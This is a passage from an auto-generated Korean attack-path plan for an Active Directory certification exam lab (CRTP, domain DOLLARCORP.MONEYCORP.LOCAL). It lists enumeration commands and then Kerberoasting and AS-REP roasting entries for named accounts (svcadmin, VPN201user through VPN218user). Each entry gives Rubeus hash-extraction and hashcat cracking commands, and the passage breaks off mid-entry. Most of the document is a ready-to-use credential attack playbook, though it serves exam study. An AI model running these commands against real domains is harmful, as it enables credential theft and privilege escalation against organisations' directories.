# 경로-증거 플랜 (findings 자동 생성)

> ⚠️ **규정**: '🖊 내 설명'·'🛡 완화'는 **본인이 직접** 작성. 이 파일은 명령/확인/증명/스크린샷 **뼈대만** 제공합니다 (AI 생성 본문 = 실격).
> 모든 스크린샷은 같은 창에 **`whoami` + 명령 + 출력**이 함께 보이게. 리스너/다운로드는 데이터서 확인된 허용 포트로.

- 도메인: `DOLLARCORP.MONEYCORP.LOCAL`  SID: `S-1-5-21-719815819-3726368948-3917688648`
- findings: 57개 (이 환경 데이터 기준 — 다른 시험 환경이면 그 JSON으로 재생성)

## STEP 0 — 시작: 나 누구 / 어디 / 무슨 권한 (공격 전 상황 파악 먼저)
- 🛠 명령어: `hostname; whoami; whoami /groups; whoami /priv; ipconfig | findstr IPv4`
- ✅ 확인: 현재 신원·권한(관리자 여부)·호스트·네트워크
- 🎯 증명: 공격 시작 시점의 최저 권한 baseline (이후 상승의 before 기준)
- 📸 스크린샷: `T0.0-baseline` (위 전체 한 화면)
- 🖊 내 설명: > _시작 권한/위치를 먼저 남기는 이유 (본인 문장)_

## PHASE 0 — 초기 발판 (초기 접근)
> ⚠ 앱레이어 — **AD 데이터 밖(GAP)**. 환경마다 다름. 특정 앱(예: 특정 CI/웹) 가정 금지.
- 🛠 닿는 포트/서비스 스캔 → 거기서 진입 (웹/빌드서버/파일공유/기본자격 등)
- 📸 발판에서 첫 OS 명령 + `whoami` (어느 계정으로 떨어졌는지)
- 🖊 내 설명: > _어떻게 최초 접근을 얻었는가_

## PHASE 1 — 정찰·열거  (★ 보고서의 큰 축 — 각 열거도 스크린샷+설명 남길 것)
> CRTP는 보고서 비중이 큼. **열거 과정 자체가 점수** — flag를 따도 열거/설명/완화/인용이 빈약하면 감점·탈락 가능. 아래 E1~E8은 각각 독립 증거 항목으로 남기세요.

### [E1] 내 권한/신원 확인
- 🛠 명령어:
    ```
    whoami /all   # groups + privileges + SID
    ```
- 📸 스크린샷 `E1-enum`: 명령 + 출력 (whoami 컨텍스트 포함되게)
- 🖊 내 설명: > _현재 계정·그룹·권한·SID — 왜 열거했고 무엇을 확인했는가 (본인 문장)_

### [E2] 도메인 기본 정보
- 🛠 명령어:
    ```
    Get-Domain
    ```
    ```
    Get-DomainController
    ```
    ```
    Get-DomainPolicy
    ```
- 📸 스크린샷 `E2-enum`: 명령 + 출력 (whoami 컨텍스트 포함되게)
- 🖊 내 설명: > _도메인/DC/정책 파악 — 왜 열거했고 무엇을 확인했는가 (본인 문장)_

### [E3] 유저·그룹·고가치 멤버십
- 🛠 명령어:
    ```
    Get-DomainUser | select samaccountname,admincount
    ```
    ```
    Get-DomainGroupMember 'Domain Admins' -Recurse
    ```
- 📸 스크린샷 `E3-enum`: 명령 + 출력 (whoami 컨텍스트 포함되게)
- 🖊 내 설명: > _DA/EA 등 최종 목표 계정 식별 — 왜 열거했고 무엇을 확인했는가 (본인 문장)_

### [E4] roastable 계정
- 🛠 명령어:
    ```
    Get-DomainUser -SPN | select samaccountname
    ```
    ```
    Get-DomainUser -PreauthNotRequired
    ```
- 📸 스크린샷 `E4-enum`: 명령 + 출력 (whoami 컨텍스트 포함되게)
- 🖊 내 설명: > _Kerberoast / AS-REP 후보 — 왜 열거했고 무엇을 확인했는가 (본인 문장)_

### [E5] 위임 설정
- 🛠 명령어:
    ```
    Get-DomainComputer -Unconstrained
    ```
    ```
    Get-DomainUser -TrustedToAuth
    ```
    ```
    # RBCD: msds-allowedtoactonbehalfofotheridentity 확인
    ```
- 📸 스크린샷 `E5-enum`: 명령 + 출력 (whoami 컨텍스트 포함되게)
- 🖊 내 설명: > _위임 기반 권한상승 후보 — 왜 열거했고 무엇을 확인했는가 (본인 문장)_

### [E6] ACL (내가 관련된 것 우선)
- 🛠 명령어:
    ```
    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<나>'}
    ```
- 📸 스크린샷 `E6-enum`: 명령 + 출력 (whoami 컨텍스트 포함되게)
- 🖊 내 설명: > _내가 악용 가능한 ACL 엣지 — 왜 열거했고 무엇을 확인했는가 (본인 문장)_

### [E7] 트러스트 관계
- 🛠 명령어:
    ```
    Get-DomainTrustMapping
    ```
    ```
    Get-ForestTrust -ErrorAction SilentlyContinue
    ```
- 📸 스크린샷 `E7-enum`: 명령 + 출력 (whoami 컨텍스트 포함되게)
- 🖊 내 설명: > _도메인/포레스트 트러스트 + 방향 + SID filtering — 왜 열거했고 무엇을 확인했는가 (본인 문장)_

### [E8] 대량 수집 → 파서
- 🛠 명령어:
    ```
    SOAPHound.exe --buildcache -c cache.json
    ```
    ```
    SOAPHound.exe -c cache.json --bhdump --nolaps -o bh
    ```
    ```
    python parser\main.py bh   # -> 아래 '후보' 자동 생성
    ```
- 📸 스크린샷 `E8-enum`: 명령 + 출력 (whoami 컨텍스트 포함되게)
- 🖊 내 설명: > _수집 데이터가 아래 후보의 입력 — 왜 열거했고 무엇을 확인했는가 (본인 문장)_

## PHASE 2 — 상황 인식: 내가 제어하는 것 / 닿는 곳 / 목표
- 🛠 `whoami /groups` · 내가 ACL 가진 객체: `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<나>'}`
- 🎯 증명: 현재 위치에서 쓸 수 있는 특권/엣지 파악 → 아래 후보 중 실제 가능한 것 선별
- **열거로 식별된 고가치 목표 (최종 수렴점)**:
  - High-value group: Account Operators: ACCOUNT OPERATORS@DOLLARCORP.MONEYCORP.LOCAL
  - High-value group: Administrators: <unknown>, DOMAIN ADMINS@DOLLARCORP.MONEYCORP.LOCAL, ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL
  - High-value group: Backup Operators: BACKUP OPERATORS@DOLLARCORP.MONEYCORP.LOCAL
  - High-value group: DnsAdmins (typical): SRVADMIN@DOLLARCORP.MONEYCORP.LOCAL
  - High-value group: Domain Admins: SVCADMIN@DOLLARCORP.MONEYCORP.LOCAL, ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL
  - High-value group: Domain Controllers: DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL
  - High-value group: Group Policy Creator Owners: ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL
- 🖊 내 설명: > _현재 권한에서 어디로 갈 수 있는지_

---

## 공격 후보 (↓ 열거로 나온 후보 — **우선순위順, 순차 필수 아님**. 라이브 결과가 다음 수를 정함)

## PHASE 3. 자격 접근 후보 — roasting / 평문 자격

### [HIGH] Kerberoasting  (prio 20)
- **대상**: svcadmin
- **근거(데이터)**: svcadmin has SPN set [adminCount=1]; pwdlastset=1668416797
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe kerberoast /user:svcadmin /nowrap /outfile:hash_svcadmin.txt
    ```
  - _PowerView_:
    ```
    Invoke-Kerberoast -Identity svcadmin | fl
    ```
  - _AD Module_:
    ```
    Get-ADUser -Identity svcadmin -Properties ServicePrincipalName | select SamAccountName,ServicePrincipalName
    ```
  - _Crack_:
    ```
    hashcat -m 13100 hash_svcadmin.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] SPN이 실제로 설정돼 있는지 (setspn -L 또는 Get-ADUser)
  - [ ] 해시 추출 성공 여부, 크랙된 평문 패스워드
  - [ ] 크랙한 계정이 어떤 그룹/권한을 가지는지 확인
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **Kerberoasting** 이(가) `svcadmin` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] svcadmin SPN 확인 (Get-ADUser/setspn 출력)
  - [ ] Rubeus kerberoast 해시 추출 화면
  - [ ] hashcat 크랙 성공 (평문 노출) 화면
  - [ ] 크랙한 계정으로 인증/권한 확인 화면
- _참고(사실): Kerberoasting svcadmin. adminCount 계정이면 곧바로 권한 상승 경로일 수 있음._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN201user
- **근거(데이터)**: VPN201user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN201user /nowrap /format:hashcat /outfile:asrep_VPN201user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN201user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN201user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN201user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN201user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN202user
- **근거(데이터)**: VPN202user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN202user /nowrap /format:hashcat /outfile:asrep_VPN202user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN202user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN202user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN202user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN202user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN203user
- **근거(데이터)**: VPN203user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN203user /nowrap /format:hashcat /outfile:asrep_VPN203user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN203user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN203user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN203user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN203user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN204user
- **근거(데이터)**: VPN204user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN204user /nowrap /format:hashcat /outfile:asrep_VPN204user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN204user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN204user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN204user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN204user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN205user
- **근거(데이터)**: VPN205user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN205user /nowrap /format:hashcat /outfile:asrep_VPN205user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN205user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN205user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN205user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN205user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN206user
- **근거(데이터)**: VPN206user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN206user /nowrap /format:hashcat /outfile:asrep_VPN206user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN206user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN206user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN206user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN206user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN207user
- **근거(데이터)**: VPN207user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN207user /nowrap /format:hashcat /outfile:asrep_VPN207user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN207user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN207user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN207user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN207user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN208user
- **근거(데이터)**: VPN208user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN208user /nowrap /format:hashcat /outfile:asrep_VPN208user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN208user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN208user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN208user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN208user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN209user
- **근거(데이터)**: VPN209user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN209user /nowrap /format:hashcat /outfile:asrep_VPN209user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN209user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN209user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN209user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN209user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN210user
- **근거(데이터)**: VPN210user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN210user /nowrap /format:hashcat /outfile:asrep_VPN210user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN210user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN210user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN210user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN210user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN211user
- **근거(데이터)**: VPN211user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN211user /nowrap /format:hashcat /outfile:asrep_VPN211user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN211user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN211user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN211user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN211user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN212user
- **근거(데이터)**: VPN212user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN212user /nowrap /format:hashcat /outfile:asrep_VPN212user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN212user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN212user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN212user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN212user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN213user
- **근거(데이터)**: VPN213user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN213user /nowrap /format:hashcat /outfile:asrep_VPN213user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN213user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN213user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN213user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN213user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN214user
- **근거(데이터)**: VPN214user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN214user /nowrap /format:hashcat /outfile:asrep_VPN214user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN214user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN214user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN214user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN214user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN215user
- **근거(데이터)**: VPN215user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN215user /nowrap /format:hashcat /outfile:asrep_VPN215user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN215user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN215user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN215user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN215user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN216user
- **근거(데이터)**: VPN216user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN216user /nowrap /format:hashcat /outfile:asrep_VPN216user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN216user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN216user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN216user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN216user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN217user
- **근거(데이터)**: VPN217user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN217user /nowrap /format:hashcat /outfile:asrep_VPN217user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN217user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN217user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
  - [ ] VPN217user DoesNotRequirePreAuth 확인 화면
  - [ ] Rubeus asreproast 추출 화면
  - [ ] hashcat 크랙 성공 화면
- _참고(사실): AS-REP roasting VPN217user — 사전 인증 불필요 계정._
- 🖊 **내 설명(본인 문장)**: > _이 명령이 무엇을 하고 왜 통했는가_
- 🛡 **완화 방안(본인 조사·인용)**: > _방어책_

### [HIGH] AS-REP Roasting  (prio 22)
- **대상**: VPN218user
- **근거(데이터)**: VPN218user has DONT_REQ_PREAUTH set
- 🛠 **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe asreproast /user:VPN218user /nowrap /format:hashcat /outfile:asrep_VPN218user.txt
    ```
  - _AD Module_:
    ```
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
    ```
  - _Crack_:
    ```
    hashcat -m 18200 asrep_VPN218user.txt <wordlist> --force
    ```
- ✅ **확인(VERIFY)**:
  - [ ] preauth 미요구 플래그 확인
  - [ ] 해시 추출 및 크랙 결과
- 🎯 **증명(PROOF)**: 위 '확인' 항목이 충족되면 → **AS-REP Roasting** 이(가) `VPN218user` 에 대해 실제로 성립함을 입증 (심각도 HIGH).
- 📸 **스크린샷**:
